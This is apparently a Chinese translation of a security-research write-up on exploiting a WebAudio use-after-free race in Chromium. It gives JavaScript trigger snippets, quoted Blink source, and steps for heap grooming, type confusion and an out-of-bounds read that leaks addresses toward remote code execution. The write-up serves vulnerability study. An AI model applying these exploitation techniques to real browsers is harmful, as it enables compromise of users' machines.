<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AudioNode::Dispose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK</span>(<span class="built_in">IsMainThread</span>());</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG_AUDIONODE_REFERENCES</span></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;[%16p]: %16p: %2d: AudioNode::dispose %16p @%g\n&quot;</span>, <span class="built_in">context</span>(),</span><br><span class="line">          <span class="keyword">this</span>, <span class="built_in">Handler</span>().<span class="built_in">GetNodeType</span>(), handler_.<span class="built_in">get</span>(),</span><br><span class="line">          <span class="built_in">context</span>()-&gt;<span class="built_in">currentTime</span>());</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="function">BaseAudioContext::GraphAutoLocker <span class="title">locker</span><span class="params">(context())</span></span>;</span><br><span class="line">  <span class="built_in">Handler</span>().<span class="built_in">Dispose</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果上下文被拉到音频图上，就把处理程序添加到孤儿列表中。 </span></span><br><span class="line">  <span class="comment">// 这将使处理程序保持运行，直到它可以在一个安全点（在处理程序任务的前/后）被删除。 </span></span><br><span class="line">  <span class="comment">// 如果图没有被拉动，我们现在就可以删除处理程序，因为音频线程上没有任何东西会接触到它。</span></span><br><span class="line">  <span class="built_in">DCHECK</span>(<span class="built_in">context</span>());</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">context</span>()-&gt;<span class="built_in">IsPullingAudioGraph</span>()) &#123;</span><br><span class="line">    <span class="built_in">context</span>()-&gt;<span class="built_in">GetDeferredTaskHandler</span>().<span class="built_in">AddRenderingOrphanHandler</span>(</span><br><span class="line">        std::<span class="built_in">move</span>(handler_));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Notify the inspector that this node is going away. The actual clean up</span></span><br><span class="line">  <span class="comment">// will be done in the subclass implementation.</span></span><br><span class="line">  <span class="built_in">ReportWillBeDestroyed</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果一个quantum正在被处理，它将把AudioHandler（handler_）的所有权转移到由AudioContext本身拥有的<code>deferred_task_handler_</code>。然后DeferredTaskHandler将确保AudioHandler保持运行，直到quantum的处理完成，然后清理孤儿AudioHandler。</p>
<p>然而，有一个例外。如果包含音频图的javascript框架被破坏了，例如，当包含图的iframe被破坏时，那么DeferredTaskHandler将在quantum仍在处理时立即进行清理，调用ClearHandlersToBeDeleted函数，这将删除孤儿AudioHandler（之前有一个信号量可以解决这个问题，但该信号量在这次<a target="_blank" rel="noopener" href="https://source.chromium.org/chromium/chromium/src/+/e4c27b508976fb751ccd4d34e52b70b668618271?originalUrl=https//////:////////cs.chromium.org/">commit</a>中被删除了）。</p>
<h2 id="控制竞争"><a href="#控制竞争" class="headerlink" title="控制竞争"></a>控制竞争</h2><p>为了在竞争获取足够的时间，来操作AudioHandler，exp使用了<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/AudioWorkletNode"><code>AudioWorkletNode</code></a>，AudioWorkletNode允许节点运行用户自定义的JavaScript代码，具体如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> audioContext.<span class="property">audioWorklet</span>.<span class="title function_">addModule</span>(<span class="string">&#x27;tear-down.js&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> worklet;</span><br><span class="line">worklet = <span class="keyword">new</span> <span class="title class_">AudioWorkletNode</span>(audioContext, <span class="string">&#x27;tear-down&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> convolver = audioContext.<span class="title function_">createConvolver</span>();</span><br><span class="line">soundSource.<span class="title function_">connect</span>(worklet).<span class="title function_">connect</span>(convolver).<span class="title function_">connect</span>(audioContext.<span class="property">destination</span>);</span><br></pre></td></tr></table></figure>

<p>可以在tear-down.js中使用sleep函数，这样就有足够的时间删除和替换ConvolverNode：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AutoProcessor</span> <span class="keyword">extends</span> <span class="title class_ inherited__">AudioWorkletProcessor</span> &#123;</span><br><span class="line">  <span class="title function_">process</span> (inputs, outputs, parameters) &#123;</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="number">5000</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>删除ConvolverNode的例子如下（实际上，convolver需要运行在另一个不调用parent.removeFrame的函数的范围之内，这里只是举个例子）：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> audioContext.<span class="property">audioWorklet</span>.<span class="title function_">addModule</span>(<span class="string">&#x27;tear-down.js&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> worklet = <span class="keyword">new</span> <span class="title class_">AudioWorkletNode</span>(audioContext, <span class="string">&#x27;tear-down&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> convolver = audioContext.<span class="title function_">createConvolver</span>();</span><br><span class="line">soundSource.<span class="title function_">connect</span>(worklet).<span class="title function_">connect</span>(convolver).<span class="title function_">connect</span>(audioContext.<span class="property">destination</span>);</span><br><span class="line">audioContext.<span class="title function_">startRendering</span>();</span><br><span class="line"><span class="title function_">sleep</span>(<span class="number">200</span>);</span><br><span class="line">worklet.<span class="title function_">disconnect</span>();</span><br><span class="line">convolver = <span class="literal">null</span>;</span><br><span class="line"><span class="title function_">gc</span>();</span><br><span class="line">parent.<span class="title function_">removeFrame</span>(); <span class="comment">//&lt;-------- Get parent frame to delete outselves;</span></span><br></pre></td></tr></table></figure>

<p>另一个有用的事实是，在这样做的时候，只有与所有输入断开连接的节点才会被删除，而与输入保持连接的节点即使在iframe被删除后也会保持活力，只有在处理完成后才会被删除。如下所示，当worklet完成处理时，convolver将保持运行直到gain结束为止：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> convolver = audioContext.<span class="title function_">createConvolver</span>();</span><br><span class="line"><span class="keyword">let</span> gain = audioContext.<span class="title function_">createGain</span>();</span><br><span class="line">soundSource.<span class="title function_">connect</span>(worklet).<span class="title function_">connect</span>(convolver).<span class="title function_">connect</span>(gain).<span class="title function_">connect</span>(audioContext.<span class="property">destination</span>);</span><br><span class="line">audioContext.<span class="title function_">startRendering</span>();</span><br><span class="line"><span class="title function_">sleep</span>(<span class="number">200</span>);</span><br><span class="line">convolver.<span class="title function_">disconnect</span>();</span><br><span class="line">gain = <span class="literal">null</span>;</span><br><span class="line"><span class="title function_">gc</span>();</span><br><span class="line">parent.<span class="title function_">removeFrame</span>(); <span class="comment">//&lt;-------- Get parent frame to delete outselves;</span></span><br></pre></td></tr></table></figure>

<h2 id="漏洞原语"><a href="#漏洞原语" class="headerlink" title="漏洞原语"></a>漏洞原语</h2><p>每个AudioHandler拥有一个音频节点的输入和输出的列表。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MODULES_EXPORT</span> <span class="title class_">AudioHandler</span> : public <span class="title class_">ThreadSafeRefCounted</span>&lt;<span class="title class_">AudioHandler</span>&gt; &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="title class_">Vector</span>&lt;<span class="attr">std</span>::unique_ptr&lt;<span class="title class_">AudioNodeInput</span>&gt;&gt; inputs_;</span><br><span class="line">  <span class="title class_">Vector</span>&lt;<span class="attr">std</span>::unique_ptr&lt;<span class="title class_">AudioNodeOutput</span>&gt;&gt; outputs_;</span><br></pre></td></tr></table></figure>

<p>AudioNodeInput（AudioSummingJunction的一个子类）也持有一个连接到它的输出列表：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AudioSummingJunction</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// m_renderingOutputs is a copy of m_outputs which will never be modified</span></span><br><span class="line">  <span class="comment">// during the graph rendering on the audio thread.  This is the list which</span></span><br><span class="line">  <span class="comment">// is used by the rendering code.</span></span><br><span class="line">  <span class="comment">// Whenever m_outputs is modified, the context is told so it can later</span></span><br><span class="line">  <span class="comment">// update m_renderingOutputs from m_outputs at a safe time.  Most of the</span></span><br><span class="line">  <span class="comment">// time, m_renderingOutputs is identical to m_outputs.</span></span><br><span class="line">  <span class="comment">// These raw pointers are safe. Owner of this AudioSummingJunction has</span></span><br><span class="line">  <span class="comment">// strong references to owners of these AudioNodeOutput.</span></span><br><span class="line">  <span class="title class_">Vector</span>&lt;<span class="title class_">AudioNodeOutput</span>*&gt; rendering_outputs_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>AudioNodeOutput保留了一个与它相连的AudioNodeInput的列表：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MODULES_EXPORT</span> <span class="title class_">AudioNodeOutput</span> final &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// This HashSet holds connection references. We must call</span></span><br><span class="line">  <span class="comment">// AudioNode::makeConnection when we add an AudioNodeInput to this, and must</span></span><br><span class="line">  <span class="comment">// call AudioNode::breakConnection() when we remove an AudioNodeInput from</span></span><br><span class="line">  <span class="comment">// this.</span></span><br><span class="line">  <span class="title class_">HashSet</span>&lt;<span class="title class_">AudioNodeInput</span>*&gt; inputs_;</span><br></pre></td></tr></table></figure>

<p>在下面的例子中，ConvolverHandler拥有一个AudioNodeInput和一个AudioNodeOutput，AudioNodeInput持有对worklet的AudioNodeOutput的引用，而AudioNodeOutput持有对gain的AudioNodeInput的引用。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">soundSource.<span class="title function_">connect</span>(worklet).<span class="title function_">connect</span>(convolver).<span class="title function_">connect</span>(gain).<span class="title function_">connect</span>(audioContext.<span class="property">destination</span>);</span><br></pre></td></tr></table></figure>

<p>当处理一个音频图时，代码实际上是从目的地开始向后传播，并调用AudioNodeInput::Pull，然后它将为每个连接到它的输出调用AudioNodeOutput::Pull。然后AudioNodeOutput::Pull调用拥有它的AudioHandler::ProcessIfNecessary，后者又会为它的输入调用AudioNodeInput::Pull，并将调用传播给连接到它的AudioHandler。这一直持续到没有输入的源节点，然后实际的处理将从调用AudioHandler::Process开始。在AudioHandler::Process完成后，它将通过AudioNodeOutput::Pull-&gt;AudioNodeInput::Pull-&gt;AudioHandler::PullInputs-&gt;AudioHandler::ProcessIfNecessary返回到下一个AudioHandler的AudioHandler::Process。下图以两个AudioHandler为例说明了这一点，下面的一个是AudioWorkletNode：</p>
<p><img src="https://securitylab.github.com/assets/img/post-images/webaudio/graph_pull.png"></p>
<p>在上图中，每个大的矩形代表了对AudioHandler所拥有的对象的所有调用，里面的小矩形代表了被调用的函数。蓝色箭头代表控制流边缘，从一个AudioHandler跳到另一个。当用一个等待了很长时间的AudioWorkletHandler来触发UAF时，相关的跳转是在AudioHandler::Process完成之后，因为在那个时候，下一个AudioHandler会被删除和替换。在上图中，红色区域表示用对象进行的调用，这些对象在调用时将被删除。此时，代码将首先返回AudioWorkletHandler拥有的AudioNodeOutput::Pull，就在对ProcessIfNecessary的调用之后。下面是它随后将遵循的代码路径，以及一些利用的可能性。</p>
<ol>
<li>当Process返回时，它首先会返回到AudioWorkletHandler的ProcessIfNecessary，然后是它所拥有的AudioNodeOutput::Pull。这时，这些对象都不会被删除（对应于图中左下角灰色框中AudioHandler::Process之后的蓝色箭头部分）。如果AudioNodeOutput::Pull是从AudioNodeInput::Pull，而不是AudioNodeInput::SumAllConnections中调用的，那么它将跳回到已释放的 AudioHandler::PullInputs，这意味着inputs_将在循环仍在迭代时被删除。</li>
<li>如果上面的inputs_的大小是一个开始，那么循环就会直接退出，而ProcessIfNecessary将从PullInputs之后继续。</li>
</ol>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AudioHandler::ProcessIfNecessary</span><span class="params">(<span class="type">uint32_t</span> frames_to_process)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="built_in">PullInputs</span>(frames_to_process);</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">bool</span> silent_inputs = <span class="built_in">InputsAreSilent</span>();</span><br><span class="line">    <span class="keyword">if</span> (silent_inputs &amp;&amp; <span class="built_in">PropagatesSilence</span>()) &#123;</span><br><span class="line">      <span class="built_in">SilenceOutputs</span>();</span><br><span class="line">      <span class="built_in">ProcessOnlyAudioParams</span>(frames_to_process);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">UnsilenceOutputs</span>();</span><br><span class="line">      <span class="built_in">Process</span>(frames_to_process);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这时，AudioHandler已经被释放了。根据InputsAreSilent的结果，虚函数PropagatesSilence或Process将被调用。</p>
<ol start="3">
<li>如果上一点中被删除的AudioHandler被另一个有效的AudioHandler替换了，这样虚拟函数的调用就不会崩溃，那么ProcessIfNecessary将返回到调用AudioNodeOutput::Pull。现在因为AudioNodeOutput和AudioHandler的大小不同，所以有可能AudioNodeOutput（在调用AudioNodeOutput::Pull）仍然被释放的情况下替换AudioHandler（堆栈&#x2F;注册表仍然存储指向被释放对象的指针，而不是替换后的AudioHandler的AudioNodeOutput）。然后，AudioNodeOutput::Pull函数将调用Bus并返回一个指向该AudioNodeOutput拥有的AudioBus对象的指针。这意味着返回值也将被释放，指向的对象（AudioBus）可以被替换成受控数据。然而，这只在从AudioNodeInput::SumAllConnections调用AudioNodeOutput::Pull的路径中才有意义，因为通过AudioNodeInput::Pull的路径并不利用返回值。</li>
</ol>
<p>虽然第二点可以通过伪造vtable来劫持控制流，但这需要有信息泄露来打败ASLR，并获得一个堆地址来存储假vtable，所以在这一点上我无法使用它。第一点有可能是非常强大的，因为它有可能让我用任何类型的指针向量来替换inputs_，导致AudioNodeInput和许多可能的类型之间的类型混淆。可以用一个简单的CodeQL查询来找到可能的类型。</p>
<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><h3 id="可选"><a href="#可选" class="headerlink" title="可选"></a>可选</h3><p>先看第三种可能，当通过SumAllConnections调用时，输出的返回值output，现在已经被释放了，被传递给SumFrom。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AudioNodeInput::SumAllConnections</span><span class="params">(scoped_refptr&lt;AudioBus&gt; summing_bus,</span></span></span><br><span class="line"><span class="params"><span class="function">                                       <span class="type">uint32_t</span> frames_to_process)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">unsigned</span> i = <span class="number">0</span>; i &lt; <span class="built_in">NumberOfRenderingConnections</span>(); ++i) &#123;</span><br><span class="line">    ...</span><br><span class="line">    AudioBus* connection_bus = output-&gt;<span class="built_in">Pull</span>(<span class="literal">nullptr</span>, frames_to_process);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sum, with unity-gain.</span></span><br><span class="line">    summing_bus-&gt;<span class="built_in">SumFrom</span>(*connection_bus, interpretation);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据summing_bus和connection_bus之间的通道数量，可以采取各种路径。最简单的路径只是调用AudioChannel::SumFrom</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AudioBus::SumFrom</span><span class="params">(<span class="type">const</span> AudioBus&amp; source_bus,</span></span></span><br><span class="line"><span class="params"><span class="function">                       ChannelInterpretation channel_interpretation)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (number_of_source_channels == number_of_destination_channels) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> i = <span class="number">0</span>; i &lt; number_of_source_channels; ++i)</span><br><span class="line">      <span class="built_in">Channel</span>(i)-&gt;<span class="built_in">SumFrom</span>(source_bus.<span class="built_in">Channel</span>(i));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>AudioChannel::SumFrom简单地将source_bus, (connection_bus)中的数据复制到summing_bus，使用summing_bus的长度。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AudioChannel::SumFrom</span><span class="params">(<span class="type">const</span> AudioChannel* source_channel)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">IsSilent</span>()) &#123;</span><br><span class="line">    <span class="built_in">CopyFrom</span>(source_channel);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//Copies using the length of `summing_bus` (`length()`)</span></span><br><span class="line">    vector_math::<span class="built_in">Vadd</span>(<span class="built_in">Data</span>(), <span class="number">1</span>, source_channel-&gt;<span class="built_in">Data</span>(), <span class="number">1</span>, <span class="built_in">MutableData</span>(), <span class="number">1</span>,</span><br><span class="line">                      <span class="built_in">length</span>());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，如果可以用一个长度短于summing_bus的Bus来替换已释放的AudioNodeOutput，那么就可以得到一个越界的读取。通过安排堆，就可以利用这一点获得一个vtable和&#x2F;或堆指针的地址，这将能够使用第二点中的虚拟函数调用原语来实现远程代码执行。</p>
<p>然而，有几个问题。首先，即使可以替换掉已释放的AudioNodeOutput，我仍然需要有一个有效的指向connection_bus的指针，这个指针是一个有效的AudioBus。一个简单的方法是用另一个有短总线的AudioNodeOutput替换AudioNodeOutput。不幸的是，所有AudioNodeOutput的Bus都是相同的长度（128），这是有道理的，否则会一直有越界的读写。另一种可能性是，由于Bus为AudioNodeOutput所有，可以直接替换Bus，而让AudioNodeOutput空出来。由于用于分配AudioNodeOutput和Bus的内存分配器PartitionAlloc是一个桶分配器，AudioNodeOutput的大小为104，而AudioBus的大小为32，通过分别操作这两个桶，可以在释放AudioNodeOutput的同时替换Bus。虽然PartitionAlloc会把释放对象的前8个字节弄乱作为额外的保护，但这并不影响AudioNodeOutput::Bus返回的指针，所以connection_bus仍然会指向用来替换的对象。如果用一个长度较短的对象替换Bus，那么就会得到一个信息泄露。</p>
<p>现在的问题是如何创建一个具有任意长度的AudioBus。看看对AudioBus::Create的各种调用，ConvolverHandler::SetBuffer中的调用看起来很有希望，因为它可以通过指定ConvolverNode的buffer字段从javascript中轻松到达。不幸的是，创建的AudioBus只是本地的，并且在函数调用结束后会被删除，这使得它很难使用。最后，WebAudioBus::Initialize中的那个函数效果更好，因为它可以通过javascript中的decodeAudioData函数达到，创建的AudioBus的长度由输入ArrayBuffer（包含一些音频数据）的大小控制。通过使用ffmpeg来创建不同长度的MP3文件，我能够使用这个函数来创建不同长度的AudioBus。</p>
<p>下一个问题更难解决。虽然可以造成越界读取，并将结果复制到summing_bus的backing store中，但由于几个原因，没有办法将这些数据读出来：</p>
<ul>
<li>为了触发UAF，需要删除包含音频图的iframe，这意味着当越界读取发生时，所有的音频节点将无法到达，因此没有办法检索属于该图的AudioNodeInput的summing_bus中的数据。</li>
<li>如果summing_bus也被释放，那么也许可以用仍然可以到达的AudioNodeInput中的另一个AudioBus来代替它，然后也许有办法从该AudioNodeInput的summing_bus中读出数据。不幸的是，情况也不是这样的，因为summing_bus不是一个原始指针，而是一个共享所有权的scoped_refptr。</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AudioNodeInput::SumAllConnections</span><span class="params">(scoped_refptr&lt;AudioBus&gt; summing_bus,</span></span></span><br><span class="line"><span class="params"><span class="function">                                       <span class="type">uint32_t</span> frames_to_process)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">unsigned</span> i = <span class="number">0</span>; i &lt; <span class="built_in">NumberOfRenderingConnections</span>(); ++i) &#123;</span><br><span class="line">    ...</span><br><span class="line">    summing_bus-&gt;<span class="built_in">SumFrom</span>(*connection_bus, interpretation);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这意味着，即使现在所有的东西都被释放了，summing_bus仍将保持活力，至少在SumAllConnections调用完成之前，所以没有办法去替换summing_bus。</p>
<p><strong>实际的方式</strong></p>
<p>回到上一节第1点中的迭代器无效原语。如前所述，通过把一个接受多个输入的AudioNode，如ChannelMergerNode放在AudioWorkletNode之后，然后删除包含音频图的iframe来触发UAF，ChannelMergerNode和由此产生的inputs_将被删除，而AudioHandler::PullInputs的循环仍在迭代中：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AudioHandler::PullInputs</span><span class="params">(<span class="type">uint32_t</span> frames_to_process)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; input : inputs_)</span><br><span class="line">    input-&gt;<span class="built_in">Pull</span>(<span class="literal">nullptr</span>, frames_to_process);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在实践中，这意味着在完成input-&gt;Pull调用后，input迭代器将被递增，并指向现在被删除的<code>input_</code>的已释放backing store中的下一个位置。这将继续下去，直到达到<code>input_</code>的长度。因此，通过分配另一个与inputs_相同大小的Vector，我用新Vector的支持存储空间替换了已释放的backing store。虽然这可以用来造成类型混乱，并在许多不同类型的对象上调用AudioNodeInput::Pull，但应该用什么对象来替换AudioNodeInput并不明显。</p>
<p>将ChannelMergerNode换成另一个ChannelMergerNode，它运行在父帧的音频图上。因此，当这个错误触发时，它将继续运行另一个运行在父帧中的音频图。</p>
<p>下面的图展示了替换这个对象时会发生什么：</p>
<p><img src="https://securitylab.github.com/assets/img/post-images/webaudio/replace_graph.png"></p>
<p>破折号边框和边表示如果子iframe没有被删除，将会被运行的节点和边，而绿色节点表示实际被运行的节点。在处理完子iframe的顶部分支后，该框架被删除，ChannelMergerNode被替换成父帧中的节点。这导致父帧中的音频图的底部分支被代替运行。</p>
<p>当删除一个AudioNode时会发生什么？正如前面解释的那样，当一个AudioNode被垃圾回收时，为了防止底层的AudioHandler被删除，而它还在被用来处理音频图，AudioNode将通过调用AudioContext的IsPullingAudioGraph方法来检查它所属的音频图是否正在被处理：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AudioNode::Dispose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">context</span>()-&gt;<span class="built_in">IsPullingAudioGraph</span>()) &#123;</span><br><span class="line">    <span class="built_in">context</span>()-&gt;<span class="built_in">GetDeferredTaskHandler</span>().<span class="built_in">AddRenderingOrphanHandler</span>(</span><br><span class="line">        std::<span class="built_in">move</span>(handler_));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>IsPullingAudioGraph检查音频图是否处于kRunning状态：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">OfflineAudioContext::IsPullingAudioGraph</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ContextState</span>() == BaseAudioContext::kRunning;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并转移AudioHandler的所有权（如果它是）。然而，在这种情况下，因为父帧中的音频图正在作为子框架中的图的一部分被处理，音频图不会处于kRunning状态，因为它没有从父帧中启动。(在实际利用中，将不得不启动然后暂停图形以使节点相互连接，但这没有什么区别，因为图形将处于kSuspended状态，所以IsPullingAudioGraph检查仍将通过)这意味着AudioHandler的所有权转移将不会发生，它将在图形被处理时被删除。</p>
<p>这意味着可以在这个图中引起同样类型的UAF，而不需要删除包含它的框架。这一点很重要，因为之前试图获得信息泄露的主要问题是，所有的节点和包含它们的iframe都被删除了，所以没有办法检索到泄露的数据。但现在可以在不删除包含节点的框架的情况下导致UAF，将能够在UAF触发后访问它们，并能够读取泄露的数据。</p>
<h3 id="获取信息泄露"><a href="#获取信息泄露" class="headerlink" title="获取信息泄露"></a>获取信息泄露</h3><p>第一步，在一个子iframe中触发UAF，并使用循环迭代器无效原语，使音频图的一个分支在父帧中运行。</p>
<p><img src="https://securitylab.github.com/assets/img/post-images/webaudio/replace_graph2.png"></p>
<p>上图显示了将用于替换的实际图形。它由两个ScriptProcessorNode夹着一个GainNode组成。ScriptProcessorNode就像AudioWorkletNode，它允许运行用户提供的脚本来处理音频数据。然而，在ScriptProcessorNode的情况下，脚本是在dom窗口的上下文中运行的，它允许我访问AudioContext和各种节点，这使得使用ScriptProcessorNode进行开发更容易，exp将在父框架图中使用它而不是AudioWorkletNode。</p>
<p>第二步，在ScriptProcessorNode脚本2的音频处理脚本中，移除跟随它的GainNode，并对其进行垃圾回收，这样它的AudioInputNode和AudioOutputNode，就被释放了。</p>
<p><img src="https://securitylab.github.com/assets/img/post-images/webaudio/replace_graph3.png"></p>
<p>为了构建信息泄露，还需要替换被删除的GainNode，以防止虚函数调用崩溃，同时让它的AudioOutputNode保持自由。可以通过操纵堆来创建额外的释放的AudioOutputNode，这样当GainNode被释放时，它的AudioOutputNode就不会在free列表的首位，不会被替换。我通过创建一个额外的ChannelMergerNode来做到这一点。</p>
